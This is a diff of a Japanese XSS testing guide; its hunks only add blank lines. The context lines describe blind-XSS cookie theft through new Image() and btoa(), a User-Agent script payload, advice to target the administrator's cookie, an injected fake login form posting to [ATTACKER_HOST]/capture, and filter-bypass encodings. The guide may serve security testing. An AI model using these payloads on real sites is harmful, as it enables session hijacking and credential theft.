@@ -86,6 +86,7 @@ grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
 ---
 
 **優先的に確認するフィールド：**
+
 - 検索バー（入力がそのままページに表示されやすい）
 - コメント・フォーラム投稿（格納型の典型）
 - エラーメッセージに入力値が含まれる箇所
@@ -94,6 +95,7 @@ grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
 - **リクエストヘッダーが反射されるエラーページ（フィルタ回避面として）**
 
 **出力の「何かが変わったか」を観察する：**
+
 - `<b>test</b>` を入力してページ上で太字になる → HTML として解釈されている
 - `<script>` タグが除去されていてもイベントハンドラが通るケースが多い
 - エラーが出ずに入力が消える → サーバー側でフィルタされている可能性
@@ -165,6 +167,7 @@ User-Agent: <script>alert(1)</script>
 ```
 
 **`new Image()` を使う理由（Blind XSS の文脈で重要）：**
+
 - 画面遷移しない → 被害者ブラウザに表示変化が出ない（管理者が異常に気付きにくい）
 - DevTools の Network タブには出るが、`<img>` 由来として混ざるため目視では見落とされやすい
 - `btoa()` で base64 化することで URL に `=` `;` などの特殊文字を含む Cookie をそのまま送れる
@@ -196,6 +199,7 @@ echo "aXNfYWRtaW49Im[...]=" | base64 -d
 ```
 
 **着眼点：**
+
 - 自分のセッションが先に届く（XSS 投稿時に自分が一度ロード → 自分の Cookie）。**1件目は捨てて2件目以降の Cookie を狙う**
 - callback の `User-Agent` が自分のブラウザと違う → 別ユーザー（管理者）のブラウザでロードされた証拠
 - 受信元 IP が自分以外 → 同上
@@ -250,6 +254,7 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 | `javascript:` をブロック | `data:text/html` スキーマや `vbscript:` に切り替える |
 
 **エンコーディング・難読化の基本戦略：**
+
 - HTML エンコーディング：`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;`
 - URL エンコーディング：`<` → `%3C`、`>` → `%3E`
 - ダブルエンコーディング：`<` → `%253C`（サーバーとブラウザで2回デコードされる経路に有効）
